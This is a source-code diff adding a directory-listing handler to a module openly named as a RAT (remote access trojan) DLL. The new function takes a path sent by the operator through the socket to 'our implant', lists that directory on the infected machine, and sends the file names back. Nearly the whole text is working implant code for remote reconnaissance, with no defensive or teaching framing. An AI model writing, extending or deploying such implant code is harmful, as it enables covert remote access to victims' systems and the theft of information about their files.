@@ -6,6 +6,65 @@
 #include "RAT-Dll-DirList.h"
 
 
+/** Handles socket work and function calls for dir list functionality
+params:
+ * clientSock - current client socket connection to our implant
+return:
+ * if successfulk we return SUCCESS; otherwise print the error code and handle appropiately
+*/
+INT handleDirList(__in SOCKET clientSock)
+{
+	INT status = SUCCESS, recvBufLen = DEFAULT_BUF_LEN;
+	CHAR recvBuf[DEFAULT_BUF_LEN], msgBuf[DEFAULT_BUF_LEN];
+	CHAR** dirFiles = NULL;
+	UINT32 numDirFiles = 0;
+
+	// Receive our directory path 
+	status = recv(clientSock, recvBuf, recvBufLen, 0);
+	if (status == SOCKET_ERROR)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-DirList::handleDirList - Failed to recv (dir path) %d\n", WSAGetLastError());
+		OutputDebugStringA(msgBuf);
+		goto cleanup; // keep trying to do things until we disconnect or receive a cleanup message
+	}
+
+	// Got our directory path 
+	sprintf_s(msgBuf, "RAT-Dll-DirList::handleDirList - Performing dir list on %s...\n", recvBuf);
+	OutputDebugStringA(msgBuf);
+
+	status = performDirList(recvBuf, &dirFiles, &numDirFiles);
+	if (status != SUCCESS)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-DirList::handleDirList - Failure received from performDirList %d\n", status);
+		OutputDebugStringA(msgBuf);
+		goto cleanup;
+	}
+
+	// Send back each of our files
+	status = sendDirFiles(clientSock, dirFiles, numDirFiles);
+	if (status != SUCCESS)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-DirList::handleDirList - Failure received from sendDirFiles %d\n", status);
+		OutputDebugStringA(msgBuf);
+		goto cleanup;
+	}
+
+	// Send back success status code
+	status = send(clientSock, "SUCCESS", 7, 0);
+	if (status == SOCKET_ERROR)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-DirList::handleDirList - Failure recevied from send (status code) %d\n", WSAGetLastError());
+		OutputDebugStringA(msgBuf);
+		status = WSAGetLastError();
+		goto cleanup;
+	}
+
+
+cleanup:
+	return status;
+}
+
+
 /** This function will perform a simple dir list for us
 params:
 * dirPath - path to the directory we want to list
